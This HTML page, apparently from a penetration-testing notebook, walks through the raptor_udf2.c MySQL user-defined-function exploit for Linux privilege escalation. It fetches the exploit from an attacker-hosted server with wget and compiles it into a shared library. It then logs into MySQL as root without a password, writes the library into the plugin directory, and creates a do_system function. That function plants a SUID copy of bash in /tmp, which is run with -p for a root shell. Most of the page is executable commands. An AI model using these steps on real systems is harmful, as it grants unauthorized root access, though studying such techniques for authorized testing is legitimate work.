<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>raptor_udf2.c</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>raptor_udf2.c</h1><br />3. Exploit with <a
      href="https://www.exploit-db.com/exploits/1518" target="_blank">https://www.exploit-db.com/exploits/1518</a> (aka <a
      href="https://0xdeadbeef.info/exploits/raptor_udf2.c" target="_blank">raptor_udf2.c</a>). We have to follow the instructions in
    the comments.<br /> 1) We have to create the shared library raptor_udf2.so <br /> <em>Attacker</em><br />
    <div class="codebox">
      <div class="codebox">
        attacker@kali:/#&nbsp;cd&nbsp;/var/www/html<br />attacker@kali:/#&nbsp;wget&nbsp;https://www.exploit-db.com/raw/1518<br />attacker@kali:/#&nbsp;python3&nbsp;-m&nbsp;http.server&nbsp;80&nbsp;-d&nbsp;/var/www/html<br />
      </div>
    </div><br /> <em>Target</em><br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;wget&nbsp;http://&lt;attackerIP&gt;/1518&nbsp;-O&nbsp;raptor_udf2.c
      </div>
    </div><br /> Now we have to create a shared library raptor_udf2.so from source file raptor_udf2.c because of that we
    are using:<br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;gcc&nbsp;-g&nbsp;-c&nbsp;-fPIC&nbsp;raptor_udf2.c&nbsp;&nbsp;&nbsp;#creation&nbsp;of&nbsp;raptor_udf2.o
      </div>
    </div><br /> <a href=""><img src="images/1287-1.png" alt="images/1287-1.png" /></a><br /> ▪ -g → debug
    informations<br /> ▪ -c → compile <br /> ▪ -fPIC → helps the shared library to get loaded as any address instead of
    some fixed address.<br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;gcc&nbsp;-g&nbsp;-shared&nbsp;-Wl,-soname,raptor_udf2.so&nbsp;-o&nbsp;raptor_udf2.so&nbsp;raptor_udf2.o&nbsp;-lc
      </div>
    </div><br /> <a href=""><img src="images/1287-2.png" alt="images/1287-2.png" /></a><br /> ▪ -g → debug
    informations<br /> ▪ -shared → generate shared object file for shared library<br /> ▪ -Wl → passes a comma-separated
    list of arguments to the linker. As its name suggests, -soname specifies the required &lt;soname&gt;, in our
    scenario <em>raptor_udf2.so</em>. &lt;soname&gt; is only a symbolic link to the shared library&#39;s &lt;real
    name&gt;<br /> ▪ -o → build output to &lt;real-name&gt; that in our scenario is <em>raptor_udf2.so</em>.
    &lt;real-name&gt; contain the actual library code<br /> ▪ -lc → links the standard C library libc<br /> <br /> 2)
    Connect to mysql<br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;mysql&nbsp;-u&nbsp;root&nbsp;-p&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#press&nbsp;two&nbsp;times&nbsp;enter&nbsp;without&nbsp;password<br />mysql&gt;&nbsp;
      </div>
    </div><br /> 3) Load shared library in mysql and create the UDF do_system <br />
    <div class="codebox">
      <div class="codebox">
        mysql&gt;&nbsp;use&nbsp;mysql;<br />mysql&gt;&nbsp;create&nbsp;table&nbsp;foo(line&nbsp;blob);<br />#load&nbsp;content&nbsp;of&nbsp;the&nbsp;shared&nbsp;object<br />mysql&gt;&nbsp;insert&nbsp;into&nbsp;foo&nbsp;values(load_file(&#39;&lt;PATH&gt;/raptor_udf2.so&#39;));<br />#for&nbsp;older&nbsp;versions&nbsp;of&nbsp;mysql&nbsp;the&nbsp;the&nbsp;location&nbsp;of&nbsp;the&nbsp;dumpfile<br />#will&nbsp;be&nbsp;&#39;/usr/lib/raptor_udf2.so&#39;.To&nbsp;be&nbsp;sure&nbsp;about&nbsp;that&nbsp;we&nbsp;can&nbsp;execute:<br />#SHOW&nbsp;VARIABLES&nbsp;LIKE&nbsp;&#39;plugin_dir&#39;;<br />#We&nbsp;have&nbsp;the&nbsp;permissions&nbsp;to&nbsp;do&nbsp;that&nbsp;because&nbsp;mysql&nbsp;is&nbsp;running&nbsp;as&nbsp;root<br />mysql&gt;&nbsp;select&nbsp;*&nbsp;from&nbsp;foo&nbsp;into&nbsp;dumpfile&nbsp;&#39;/usr/lib/mysql/plugin/raptor_udf2.so&#39;;<br />#creation&nbsp;of&nbsp;a&nbsp;mysql&nbsp;function&nbsp;which&nbsp;use&nbsp;the&nbsp;shared&nbsp;object<br />mysql&gt;&nbsp;create&nbsp;function&nbsp;do_system&nbsp;returns&nbsp;integer&nbsp;soname&nbsp;&#39;raptor_udf2.so&#39;;<br />
      </div>
    </div> <br /> 4) creation of a shell with root permissions with chmod<br />
    <div class="codebox">
      <div class="codebox">
        mysql&gt;&nbsp;select&nbsp;do_system(&#39;cp&nbsp;/bin/bash&nbsp;/tmp/rootbash;&nbsp;chmod&nbsp;+s&nbsp;/tmp/rootbash&#39;);<br />mysql&gt;&nbsp;exit
      </div>
    </div> <br /> <a href=""><img src="images/1287-3.png" alt="images/1287-3.png" /></a><br /> 5) Execute the rootshell
    in privileged mode as explained in <a
      href="Methodology--Network_Pentest--Post_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--1._Spawn_SUID_Root_Shells--SUID_Shells.html">SUID
      shells</a><br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;/tmp/rootbash&nbsp;-p</div>
    </div><br /> <a href=""><img src="images/1287-4.png" alt="images/1287-4.png" /></a><br /> -p → Turn on privileged
    mode. In this mode bash keep the <span style="color:#ff0000;">effective ID</span> it is launched with the SUID bit,
    instead of the <span style="color:#ff0000;">effective ID</span> of the actual user.<br />
  </div>
</body>

</html>